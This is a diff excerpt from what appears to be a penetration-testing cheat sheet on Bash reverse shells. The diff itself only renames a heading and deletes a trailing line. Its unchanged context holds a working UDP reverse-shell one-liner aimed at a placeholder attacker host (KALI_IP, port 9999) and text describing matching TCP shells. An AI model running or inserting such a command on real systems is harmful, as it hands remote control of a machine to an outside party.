@@ -6,7 +6,7 @@ tags:
 date: 2024-10-18
 ---
 
-## Bash TCP Reverse Shells
+## Bash TCP Reverse Shell
 These TCP reverse shells will attempt to make a connection to your KALI machine using port 9999. Make sure to setup a TCP Listener.
 
 ```bash
@@ -23,4 +23,3 @@ The UDP shells will attempt to make a connection to your KALI machine using port
 sh -i >& /dev/udp/KALI_IP/9999 0>&1
 ```
 
----
